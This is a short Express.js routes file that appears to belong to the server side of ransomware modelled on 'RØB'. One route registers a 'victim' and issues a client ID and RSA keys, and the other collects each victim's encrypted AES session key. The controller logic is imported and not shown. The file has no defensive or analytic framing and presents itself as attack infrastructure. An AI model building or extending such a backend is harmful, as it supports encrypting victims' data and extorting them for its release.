import express from 'express';
import { newVictim, reportSessionKey } from '../controllers/attackController.js';

const router = express.Router();

// RØB Logic Routes
// POST /new -> Generates ClientID + RSA Keys. Frontend saves this to localStorage.
router.post('/new', newVictim); 

// POST /session-keys -> Receives the encrypted AES key from the victim.
router.post('/session-keys', reportSessionKey);

router.get('/health', (req, res) => res.json({ ok: true }));

export default router;